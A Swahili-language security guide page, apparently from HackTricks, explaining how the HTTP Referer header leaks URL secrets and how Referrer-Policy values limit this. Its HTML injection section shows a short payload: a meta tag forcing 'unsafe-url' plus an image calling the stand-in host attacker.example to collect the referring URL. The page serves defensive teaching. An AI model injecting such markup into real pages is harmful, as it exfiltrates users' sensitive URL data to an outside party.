# Tabia ya Kuvutia ya HTTP

{{#include ../banners/hacktricks-training.md}}

## Kichwa cha `Referer` na Sera ya Referrer

Kichwa cha ombi cha HTTP `Referer` hutambulisha URL kamili au sehemu ya URL ambayo rasilimali iliombwa kutoka humo. Kulingana na sera ya referrer inayotumika, kinaweza kujumuisha origin, path na query string inayorejelea, lakini si URL fragment.<sup>[[1]](#references)</sup>

### Sensitive Information Leak

Siri zilizo kwenye URL paths au query parameters zinaweza kuvuja kupitia historia ya browser, logs, analytics, links zilizokopiwa na kichwa cha `Referer`. Kwa hivyo, link ya cross-origin au ombi la subresource linaweza kufichua URL inayorejelea kwa server ya nje.<sup>[[2]](#references)</sup>

### Hatua za Kupunguza Hatari

Tumia kichwa cha jibu cha `Referrer-Policy` kudhibiti kiasi cha maelezo ya referrer ambayo browser hutuma. `strict-origin-when-cross-origin` ndiyo default ya kisasa katika browsers, huku `no-referrer` ikikandamiza kabisa kichwa hicho; chagua sera inayolingana na mahitaji ya application.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Usiweke passwords, vitambulisho vya session, API keys, au thamani nyingine nyeti kwenye URLs. Zitume katika request headers au bodies zinazofaa kupitia TLS badala yake.<sup>[[2]](#references)</sup>

### Mazingatio ya HTML Injection

Hati inaweza pia kuweka policy ya ukurasa mzima kwa kutumia `<meta name="referrer">`. Ikiwa dosari ya HTML injection inamruhusu mshambulizi kuingiza meta element inayofanya kazi, mshambulizi anaweza kujaribu kudhoofisha policy ya hati kwa requests zinazofuata. Meta policies zinazoingizwa dynamically au zinazokinzana zinaweza kufanya kazi bila kutabirika, kwa hiyo thibitisha tabia hiyo katika browser lengwa badala ya kudhani kwamba response header daima itabatilishwa.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Rekebisha HTML injection iliyopo kwenye msingi na uweke data nyeti nje ya URL; referrer policy ni ulinzi wa tabaka nyingi, si mbadala wa udhibiti wowote kati ya hiyo miwili.

## References

- [1] [MDN - Kichwa cha `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Matumizi ya GET Request Method Yenye Query Strings Nyeti](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - Kichwa cha `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
